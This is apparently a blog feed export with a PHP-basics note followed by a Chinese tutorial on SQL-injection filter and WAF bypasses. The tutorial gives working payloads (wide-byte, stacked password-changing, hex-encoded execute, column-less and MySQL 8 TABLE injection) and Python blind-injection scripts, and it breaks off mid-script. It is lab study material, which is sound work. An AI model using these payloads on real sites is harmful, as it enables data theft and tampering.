<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table>
<thead>
<tr>
<th>与</th>
<th>或</th>
<th>异或</th>
<th>非</th>
</tr>
</thead>
<tbody><tr>
<td>and   &amp;&amp;</td>
<td>or   ||</td>
<td>xor</td>
<td>!</td>
</tr>
</tbody></table>
<p>异或：有且仅有一个为true，则返回true<br>非：如果为假则返回真</p>
<h2 id="组合比较符（太空船）"><a href="#组合比较符（太空船）" class="headerlink" title="组合比较符（太空船）"></a>组合比较符（太空船）</h2><p><code>$c = $a &lt;=&gt; $b;</code></p>
<blockquote>
</blockquote>
<pre><code>如果 $a &gt; $b, 则 $c 的值为 1。
如果 $a == $b, 则 $c 的值为 0。
如果 $a &lt; $b, 则 $c 的值为 -1。
</code></pre>
<p>c语言的strcmp()函数</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><strong>数组创建</strong></p>
<ol>
<li><code>$arr=array();</code></li>
<li><code>$arr=[];</code></li>
</ol>
<p><strong>多维数组</strong></p>
<ol>
<li>多维数组创建<br>$arr&#x3D;[<br>[];<br>];</li>
<li>多维数组的调用<br>$arr[0][1]   &#x2F;&#x2F;<em>可以索引数组和关联数组相结合</em></li>
</ol>
<p><strong>关联数组</strong><br>分配给数组指定的键值对,以下两种创建方式是相同的<br><code>$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>]=<span class="string">&quot;35&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Ben&#x27;</span>]=<span class="string">&quot;37&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Joe&#x27;</span>]=<span class="string">&quot;43&quot;</span>; </span><br></pre></td></tr></table></figure>

<p><strong>与数组有关的函数（方法）</strong></p>
<ol>
<li><code>key($arr);</code><br>返回数组的键值（下标）</li>
<li><code>current($arr)</code><br>返回数组的值</li>
<li><code>next($arr)</code><br>使数组指针下移，返回下移后的数组的值，最后返回FALSE</li>
<li><code>prev($arr)</code><br>使数组指针上移，返回下移后的数组的值，最后返回FALSE</li>
<li><code>count($arr)</code><br>计算数组长度(元素数量)</li>
<li><code>list($a,$b)=&amp;arr</code><br>将数组第一个值付给$a，第二个值付给$b,以此类推，加上循环可以遍历数组</li>
</ol>
<h2 id="数组排列"><a href="#数组排列" class="headerlink" title="数组排列"></a>数组排列</h2><blockquote>
</blockquote>
<pre><code>sort() - 对数组进行  升序  排列
rsort() - 对数组进行  降序  排列
asort() - 根据关联数组的  值，  对数组进行  升序  排列
ksort() - 根据关联数组的  键，对数组进行  升序  排列
arsort() - 根据关联数组的  值，对数组进行  降序  排列
krsort() - 根据关联数组的  键，对数组进行  降序  排列
r是降序，k是键，a是值
</code></pre>
<p>运行实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">rsort</span>(<span class="variable">$cars</span>);   <span class="comment">//逆序排列字母元素</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cars</span>)</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>结果 <code>Array( [0] =&gt; BMW [1] =&gt; Toyota [2] =&gt; Volvo )</code>   <em>自动标出键值对</em></p>
<h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>php语言的for循环，while循环和c语言中的循环没有区别，这里不过多介绍<br>主要介绍运行foreach循环<br>foreach用于<strong>遍历数组</strong>，有以下两种形式</p>
<blockquote>
</blockquote>
<pre><code>foreach($array as $value)
&#123;
    要执行代码;   //每进行一次循环，当前数组元素的值就会被赋值给 $value 
&#125;
</code></pre>
<blockquote>
</blockquote>
<pre><code>foreach($array as $key=&gt; &amp;value)
&#123;
    要执行代码;   //每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量
&#125;
</code></pre>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="string">&quot;aa&quot;</span>=&gt; <span class="number">1</span>,<span class="string">&quot;bb&quot;</span>=&gt; <span class="number">2</span>,<span class="string">&quot;cc&quot;</span>=&gt; <span class="number">3</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>. <span class="string">&quot;=&gt;&quot;</span> .<span class="variable">$value</span>. PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果</p>
<blockquote>
</blockquote>
<pre><code>aa=&gt;1
bb=&gt;2
cc=&gt;3
</code></pre>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol>
<li>php函数用<code>function</code>关键字</li>
<li>函数可以传参，可以传址，如果参数个数不确定的情况下可以用<strong>点语法</strong><br>例如  <code>function sum(...$var)&#123;&#125;</code>  &#x2F;&#x2F;<em>注意$var是个数组</em></li>
<li>参数可以设定<strong>默认值</strong><br>例如  <code>function sum($var=100)&#123;&#125;</code> &#x2F;&#x2F;<em>没有传递参数时使用默认值</em></li>
<li>参数可以<strong>强制类型</strong><br>例如  <code>function sum(int $var)&#123;&#125;</code><br>&#x2F;&#x2F;<em>在函数前面加上declare(strict_types&#x3D;1);变成严格模式，字符与整形也不能互传</em></li>
<li>函数<strong>返回值约束</strong><br>例如  <code>function sum(int $var): string</code><br>&#x2F;&#x2F;<em>返回类型前加上问号，代表返回值可有可无</em></li>
<li>函数的特殊用法：<strong>变量函数</strong><br>函数在调用时的函数名可以是一个变量<br>例如:<blockquote>
</blockquote>
<pre><code>&amp;name=&quot;fun&quot;;
function fun()&#123;&#125;;
$name();
</code></pre>
</li>
</ol>
<p>根据函数名的变化调用不同的函数</p>
<h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><p>PHP 向它运行的任何脚本提供了大量的预定义常量。<br><strong>定义</strong>：有八个魔术常量的值是随着在代码中的位置而改变</p>
<blockquote>
</blockquote>
<pre><code>__LIEN__
__FILE__
__DIR__
__FUNCTION__
__CLASS__
__TRAIL__
__METHOD__
__NAMESPACE__
</code></pre>
<ol>
<li><p>__LINE__<br>文件中LINE所在的行号</p>
</li>
<li><p>__FILE__<br>文件完整的路径和文件名</p>
</li>
<li><p>__DIR__<br>文件所在的目录（也就是FILE减去文件名&#x3D;&#x3D;<code>dirname(__FILE__)</code>）</p>
</li>
<li><p>__FUNCTION__<br>函数名称（当然得写在函数里）</p>
</li>
<li><p>__CLASS__<br>类的名称，php5起返回类被定义时候的名称（区分大小写）</p>
</li>
<li><p>__TRAIT__<br>trait的名字</p>
</li>
<li><p>__METHOD__<br>类的方法名，返回该方法被定义时的名称</p>
</li>
<li><p>__NAMESPACE__<br>当前命名空间的名称</p>
</li>
</ol>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>语法:<br><code>namespace 空间名;</code><br>每一个命名空间类似于一个文件夹，函数类似于文件，同一个文件夹不能有相同命名的文件，所以需要使用命名空间，使用命名空间的函数时，用<code>NAMESPACE\函数名</code>的格式调用</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入2.0</title>
    <url>/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/</url>
    <content><![CDATA[<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><ol start="0">
<li><p><strong>过滤原理</strong><br>经过前段时间的学习,已经可以通过一些方法去查询想要的数据,但一些网站会对一些关键字符进行过滤,也就是说输入进去的字符没法正常的进入到查询语句里.例如<code>preg_replace(参数1,参数2,参数3)</code>函数,会将参数三进行检测,如果发现参数1,则替换为参数2,而对关键字符进行替换删除</p>
</li>
<li><p><strong>绕过原理</strong><br>将被绕过的字符换成另一种表达方式,从而实现绕过过滤</p>
</li>
<li><p><strong>如何判断页面过滤对象</strong><br>从简单的注入语句开始,一步步增加复杂性,通过此方法判断过滤对象</p>
</li>
</ol>
<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><ol start="0">
<li><p><strong>常见的注释</strong><br><code>--+</code> <code>#</code> <code>%23</code>建议先尝试这三种,都失效了再尝试其他<br>url里好像不能直接用<code>#</code>,要使用<code>%23</code></p>
</li>
<li><p><strong>绕过手法</strong><br><code>,&#39;3</code>最后一个单引号实现闭合,<code>3</code>可以换成任意数字,这种适用于union查询<br>可以将查询写成这样的形式<br><code>union select 1,(查询语句),3,4&#39;</code><br>这样一来最后的数字可以带一个单引号实现闭合</p>
<p>注释符失效的情况下,可以参考注入编码的方式,用类似于<code>and &#39;1&#39; =&#39;1</code>(或者<code>or &#39;1&#39;=&#39;1</code>)这样的语句对后面的内容实现闭合<br>注意:这种方式闭合可能导致<code>order by</code>,<code>group by</code>失效,原因暂时未知</p>
</li>
</ol>
<h2 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h2><ol>
<li><strong>绕过手法</strong><ol>
<li>使用大小写绕过<br>因为SQL语句不区分大小写,可以故意写错成类似于<code>AnD,anD,oR</code>这样的形式来绕过过滤检测</li>
<li>复写过滤字符<br>如果过滤的方式是检测到关键字符就删除,可以采用复写的方式绕过<code>anandd</code>,将关键词删除后又成为了关键词</li>
<li>用符号代替<br>可以用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code>,但是用get提交可能会失效,要使用URL编码(<code>%26=$</code>)(<code>%7C=|</code>)</li>
<li>注意<br>如果语句过滤了and和or,单词里的也会收到影响(复写一下),如inf<strong>or</strong>mation</li>
</ol>
</li>
</ol>
<h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><ol>
<li>等于号被过滤了可以采用<code>like</code>进行绕过,如果空格也被过滤了,可以在两边加上扩号</li>
</ol>
<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ol>
<li>使用<code>+</code>,<code>%20</code>号代替空格</li>
<li>使用URL编码绕过空格<br> <code>\**\</code> <code>%09</code>  <code>%0A</code>  <code>%0B</code>  <code>%0C</code>  <code>%0D</code>  <code>%A0</code><br> <img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230331163940.png"></li>
<li>使用报错注入<br>原因:报错注入语法里没有空格,查询语句中的空格全部用<strong>括号</strong>代替<br><code>and 1=extractvalue(100,concat(0x7e,(插入以下语句)))</code><br>查表名:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())</span><br></pre></td></tr></table></figure>
查列名:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())<span class="keyword">and</span>(table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span>)</span><br></pre></td></tr></table></figure>
查数据:<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>))<span class="keyword">from</span>(爆破出来的表名)</span><br></pre></td></tr></table></figure>

显示不全用下面这个<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="built_in">substring</span>(group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>),<span class="number">1</span>,<span class="number">30</span>))<span class="keyword">from</span>(爆破出的表名)</span><br></pre></td></tr></table></figure></li>
<li>注意:sqli-libs第26关同时过滤了<strong>注释符</strong>,<strong>and和or</strong>,<strong>空格</strong>,要结合以上方法来做</li>
</ol>
<h2 id="substring过滤"><a href="#substring过滤" class="headerlink" title="substring过滤"></a>substring过滤</h2><ol>
<li><code>right(字段,位数)</code>从位数开始向右显示<br><code>left(字段,位数)</code>从位数开始向左显示<br>例:<code>select (right(爆破字段1,30)) from (爆破出的表名)</code><br>从第三十个开始向左显示</li>
</ol>
<h2 id="union和select过滤"><a href="#union和select过滤" class="headerlink" title="union和select过滤"></a>union和select过滤</h2><p>其实思路和<strong>and和or</strong>过滤差不多,利用大小写组合,复写,等方式绕过</p>
<h2 id="逗号过滤Join绕过"><a href="#逗号过滤Join绕过" class="headerlink" title="逗号过滤Join绕过"></a>逗号过滤Join绕过</h2><p>一般用到逗号的地方只有<code>union select 1,2,3</code>(列数必须一致),还有<code>select group_concat(爆破字段1,爆破字段2) from 爆破出来的表名</code></p>
<ol>
<li>爆破字段可以分开查询</li>
<li>union列数必须保持一致,这时候利用join<br><code>union select 1,2,3</code>&#x3D;<code>union select * from (select 1)a join (select 2)b join (select 3)c</code><br>注意:a,b,c是取得别名,将查询语句写入括号内,用jion关联</li>
</ol>
<h2 id="char-函数"><a href="#char-函数" class="headerlink" title="char()函数"></a>char()函数</h2><p>可以将函数内的十进制数字转化为ascii编码对应字符<br>如char(117,115,101,114,115)&#x3D;’users’<br>在爆破字段名时可以绕过引号</p>
<h2 id="addslashes过滤宽字节绕过"><a href="#addslashes过滤宽字节绕过" class="headerlink" title="addslashes过滤宽字节绕过"></a>addslashes过滤宽字节绕过</h2><ol>
<li><code>adddslashes()</code>函数<br>可以在输入的预定义字符(单引号<code>&#39;</code>  双引号<code>&quot;</code>  反斜线<code>\</code>  <code>NULL</code>字符)前自动添加转义字符<code>\</code>,这样一来,注入语句中的符号就会被转义成这个字符本身,无法构成闭合</li>
<li><strong>条件</strong>:<br>想要使用宽字节绕过,必须采用的是GBK编码</li>
<li><strong>原理</strong>:<br>在预定义字符前加上<code>%df</code>,这样一来<code>%df</code>会和自动添加的<code>\</code>组合,被识别成SQL无法理解的汉字,从而使<code>\</code>失去转义功能</li>
<li><strong>使用汉字</strong><br>有些汉字是三个字节的编码,代替<code>%df</code>时,可以前两个字节为一组,后两个字节为一组,从而过滤掉反斜杆,例如<code>汉&#39; or 1=1 #</code></li>
</ol>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ol>
<li><strong>原理</strong><br>在一些情况下,使用了addslashes()等函数对用户输入的特殊字符进行了转义,但是对于这些数据,在写入到数据库时,还是保留了原来的数据,在保存到数据库的数据,就被认为是可信的,再下一次需要查询时,没有再次进行检验,就会造成二次注入.<br>大多出现在一些需要注册和登入的情况下</li>
<li><strong>流程</strong><ol>
<li>需要构造含有转义字符的恶意查询语句</li>
<li>需有一处可以进行恶意数据的插入(比如注册)</li>
<li>需要另一处引用了这个数据的操作(比如登入)<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230413180315.png"></li>
</ol>
</li>
</ol>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ol>
<li><p><strong>原理</strong><br><code>mysql_multi_query()</code>函数执行一个或多个数据库的查询,其中用逗号进行分割.如果代码中用到这个函数,很有可能产生堆叠注入,所谓的堆叠注入,其实就是一堆sql语句一起注入执行,这对安全的危害是十分巨大的,如果产生堆叠注入,用户可能可以通过语句对数据的数据进行修改,增加,甚至删除</p>
</li>
<li><p>写法<code>id = 1&#39;;update users set password=123 where id=1;</code><br>查询id&#x3D;1的数据,并将users表里的id&#x3D;1的用户密码修改成123,引号是为了将前面的数据闭合</p>
</li>
<li><p><strong>用处</strong><br>一般<code>select</code>被过滤的情况下,常规注入全都无可奈何了,这时候可以尝试堆叠注入,堆叠注入可以利用其他命令来达成获取数据</p>
<ol>
<li><p><strong>使用show查 库名,表名,字段名</strong><br> 爆数据库名:<code>show databases</code><br> 爆表名<code>show tables</code><br> 爆字段名<code>show columns from 表名</code> </p>
</li>
<li><p><strong>使用16进制编码绕过</strong><br> 先看payload<br> <code>1&#39;;SET@a=十六进制编码后的命令;prepare execsql from @a;execute execsql;#</code><br> 解释<br> <code>set@a</code>是设置一个变量a储存编码后的命令(如<code>select * from 表名</code>)<br> <code>prepare execsql from @a</code>是预处理语句,会将a进行编码转化,储存在execsql中<br> <code>execute execsql</code> EXECUTE语句是SQL中的一个语句，它用于执行Transact-SQL批处理中的命令字符串<br> 转化16进制的<a href="http://www.hiencode.com/hex.html">网站</a>（记得前面加个0x）<br> 或者用python脚本跑一下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">input_string =<span class="string">&quot;select * from `1919810931114514`&quot;</span></span><br><span class="line">hex_string = string_to_hex(input_string)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;0x&quot;</span>+hex_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>handler处理程序</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER是MySQL中的一个语句，它提供了对表存储引擎接口的直接访问。它可用于InnoDB和MyISAM表。HANDLER语句有多种形式，包括HANDLER ... OPEN、HANDLER ... READ和HANDLER ... CLOSE等。</span><br><span class="line"></span><br><span class="line">HANDLER ... OPEN语句用于打开一个表，使其能够使用后续的HANDLER ... READ语句进行访问。这个表对象不会被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭。</span><br><span class="line"></span><br><span class="line">HANDLER ... READ语句用于从表中读取数据。它有多种形式，可以根据索引、索引顺序或自然行顺序来读取数据。</span><br><span class="line"></span><br><span class="line">HANDLER ... CLOSE语句用于关闭使用HANDLER ... OPEN打开的表。</span><br></pre></td></tr></table></figure>
<p> 看一下<strong>payload</strong>(<code>as a</code>是取别名):</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; handler `表名` open as `a`; handler `a` read next;#</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><p>在已经确定有waf(防火墙)的情况下,不要一步输入所有指令,而是一步步添加,发现哪个指令被拦截,就绕过哪个指令<br>一般有以下几种情况</p>
<ol>
<li>某个特殊字符后面不能接一些字符,否则报错</li>
<li>几个特殊字符后面不能接一些字符,否则报错</li>
<li>不能出现一些特殊字符,否则报错</li>
</ol>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ol start="0">
<li><strong>原理</strong>:<br>某个特殊字符后面不能接一些字符,否则报错,如<code>select</code>和<code>union</code>,这两个放在一起会被过滤,这时候在中间插入注释符混淆,如<code>/*!90000 */</code>,让防火墙误以为里面内容也是要执行,实际上在mysql里会被注释,从而实现绕过</li>
<li><code>--+</code>,<code>#</code></li>
<li><code>/*  */</code><br>在sql里,<code>/* */</code>里的内容将会被注释,不做执行</li>
<li><code>/*! */</code><br>这是mysql的扩张解释,如果在前面的星号后面加上感叹号<code>!</code>,那么注释里的内容又会被执行</li>
<li><code>/*!50000 */</code><br>表示mysql是5.00.00以上的版本时,注释符里的内容才会被执行,可以将感叹号后面的数字改成一个很大的不存在的版本,这样注释里的语句就不会执行</li>
</ol>
<h2 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h2><p>原理:在关键字符中插入,一个注释符后面加上一个任意字符和换行符,如<code>select --+a%0A union</code>让防火墙误以为select后面是字符a,实际上a被注释后换行,union不受影响</p>
<h2 id="and和or替换"><a href="#and和or替换" class="headerlink" title="and和or替换"></a>and和or替换</h2><ol>
<li><code>&amp;&amp;</code>和<code>||</code>进行替换</li>
<li>使用异或<br> 简单来说异或就是同真同假为0,不同为1<br> <code>?id=1^1^0</code>  可以替换<code>?id=1 and 1=2</code>的功能<br> <code>?id=1^1^1</code>  可以替换<code>?id=1 and 1=1</code>的功能<br> 注意,布尔盲注也可以用异或来代替and,在<code>if()</code>被禁用时,似乎是个不错的选择(闭合为整数型)<br> <code>?id=1^1^(ascii(substr((select(database())),1,1))&gt;100)</code></li>
<li>使用真假判断<br> <code>?id=1 &amp;&amp; ture</code>   如果过滤了and后面接数字的情况,可以替换<code>?id=1 and 1=1</code>的功能<br> <code>?id=1 &amp;&amp; false</code>   如果过滤了and后面接数字的情况,可以替换<code>?id=1 and 1=2</code>的功能</li>
</ol>
<h2 id="group-by替换order-by"><a href="#group-by替换order-by" class="headerlink" title="group by替换order by"></a>group by替换order by</h2><p><code>order by</code>在很多情况下更好用,但是相对防火墙的限制也更严格</p>
<h2 id="information-schema-tables替换"><a href="#information-schema-tables替换" class="headerlink" title="information_schema.tables替换"></a>information_schema.tables替换</h2><p>如果 <code>information_schema</code>被过滤了的话,里面有两个关键数据表就无法读取<code>tables</code>和<code>columns</code></p>
<ol>
<li><p><code>table_schema</code>不变<br> <code>sys.schema_table_statistics_with_buffer</code><br> <code>sys.x$ps_schema_table_statistics_io</code></p>
</li>
<li><p><code>table_schema</code>替换成<code>database_name</code><br> <code>mysql.innodb_table_stats</code>  <code>mysql.innodb_table_index</code></p>
</li>
</ol>
<h2 id="join法获取列名-information-schema-columns替换"><a href="#join法获取列名-information-schema-columns替换" class="headerlink" title="join法获取列名(information_schema.columns替换)"></a>join法获取列名(information_schema.columns替换)</h2><ol>
<li><strong>前提</strong>:页面必须存在报错回显</li>
<li><strong>语法</strong><br><code>union select * from(select*from 爆出的表名 as a join 同一个表名 as b)c</code><br>这时候会显示出第一个表名,使用<code>using()</code>函数逐渐加入爆出来的字段,获得下一个字段<br><code>union select * from(select*from 爆出的表名 as a join 同一个表名 as b using(第一个列名,第二个列名...))c</code></li>
</ol>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><ol>
<li><strong>获取数据</strong><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 爆破出的表名)k),<span class="number">3</span></span><br></pre></td></tr></table></figure></li>
<li><strong>原理</strong><br>和之前的密码绕过一样,这里利用到的是union查询时会将两张表中的数据合并<strong>创建虚拟表</strong>的特性<br><code>select 1,2,3 as b union select * from 爆破出的表名</code><br>这句话的作用就是创建一个如下的虚拟表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----+--------+---------+</span><br><span class="line">| 1  | 2      | 3别名(b)|</span><br><span class="line">+----+--------+---------+</span><br><span class="line">|  1 | 2      | 3       |</span><br><span class="line">|  1 | zzzz   | mmmm    |</span><br><span class="line">|  2 | admin  | admin   |</span><br><span class="line">|  3 | admin1 | admin1  |</span><br><span class="line">+----+--------+---------+</span><br><span class="line">可以发现这样一来已经不需要知道原来的表名了,只需要把这个当做新表查询即可</span><br></pre></td></tr></table></figure>
因为是新创建的表写在前面,原来的表写在后面,如果反过来,是不是就是在原来的表中增加数据了呢,就可以实现密码绕过了</li>
<li><strong>注意</strong><br><code>select 1,2,3 as b</code>需要逐步尝试列数,as是取别名,最后用取的别名来代替原来的名称</li>
</ol>
<h2 id="mysql-8-0-select绕过"><a href="#mysql-8-0-select绕过" class="headerlink" title="mysql 8.0+ select绕过"></a>mysql 8.0+ select绕过</h2><ol>
<li><p><strong>适用于什么情况</strong><br>如果select关键词被完全过滤,且不存在堆叠注入的情况下,一般情况下是无法进行SQL注入的<br>但是<code>mysql 8.0.19</code>的版本增加了一些新特性,可以利用这些新语法在不使用select的情况下也能进行查询</p>
</li>
<li><p><strong>TABLE</strong><br><code>table</code>列出表的所有内容，类似于SELECT,支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。<br><code>TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code><br>需要注意的是 1. table始终显示表的所有列(<code>table user</code>&#x3D;<code>select * from user</code>) 2. 不允许有WHERE子句</p>
</li>
<li><p><strong>VALUES</strong><br><code>VALUES</code>列出一行的值。<br><code>ROW()</code>返回的是一个行数据，VALUES和ROW()配合使用,返回的行数据加上字段整理为一个表<br>我们可以利用这个特性用values来判断当前语句表列数以及是否有回显<br><code>union values row(1,2,3,...)#</code><br>如果原表中的列数与<code>row()</code>中的数字数不同时,就会报错</p>
</li>
<li><p><strong>盲注</strong><br>由上面的知识可以知道,table查询的表代表的是所有列,如果要使用table进行union联合查询的话,必须要table查询的表和原来语句中的表的列数是相同的,不能像select联合查询那么自由,所以很多时候,我们只能用盲注来获取想要的数据<br>学到的一种新的无列名盲注<br><code> or (1,&#39;Tom&#39;,&#39;123&#39;) &lt;= (table user limit 0,1)#</code><br>实质上这个语句是<code>table user limit 0,1</code>查询user表中的第一行,与另一个我们自己列出的数据进行大于等于<code>&lt;=</code>的比较，比较顺序为自左向右(一个字符一个字符比较)，第一列(也就是第一个引号内的数据<code>&#39;Tom&#39;</code>)判断正确再判断第二列(也就是第二个引号内<code>&#39;123&#39;</code>)。<br><strong>ps:当然这个例子中实际上的第一列应该是id,整数型的1,一般情况下都是如此</strong><br>采用这种方式进行比较盲注的话,列数就可以由自己控制了,我们只需要一个字符一个字符,一列一列的慢慢进行比较即可盲注出结果(前提是可以盲注)<br>给个python脚本,虽然写的比较烂,这个是POST脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = <span class="number">150</span></span><br><span class="line">mid = (left + right) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right):</span><br><span class="line">    a=<span class="built_in">chr</span>(mid)</span><br><span class="line">    date = &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="comment"># post要提交的pyload,每次输出的结果都要手动再加上去,才能判断下一个,每次判断的数据就是&#123;a&#125;的位置,判断完了第一行再把limit的数值改改</span></span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;a&#x27;or 1=((1,&#x27;<span class="subst">&#123;a&#125;</span>&#x27;,&#x27;&#x27;) &lt;= (table 要查询的表 limit 0,1))#&quot;</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment">#二分法判断</span></span><br><span class="line">        left = mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = <span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(table)  <span class="comment">#打印出来的最后一个字符才是表中的字符</span></span><br></pre></td></tr></table></figure>
<p>GET脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 真值条件</span></span><br><span class="line">bihe = <span class="string">&quot;?id=1&#x27;&quot;</span>  <span class="comment"># 判断闭合方式</span></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = <span class="number">150</span></span><br><span class="line">mid = (left + right) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right):</span><br><span class="line">    a = <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="comment"># get提交的pyload,每次输出的结果都要手动再加上去,才能判断下一个,每次判断的数据就是&#123;a&#125;的位置,判断完了第一行再把limit的数值改改</span></span><br><span class="line">    payload = <span class="string">f&quot;or 1=((1,&#x27;<span class="subst">&#123;a&#125;</span>&#x27;,&#x27;&#x27;) &lt;= (table 要查询的表 limit 0,1))%23&quot;</span></span><br><span class="line">    new_url = url + bihe + payload</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url).text:  <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">        left = mid + <span 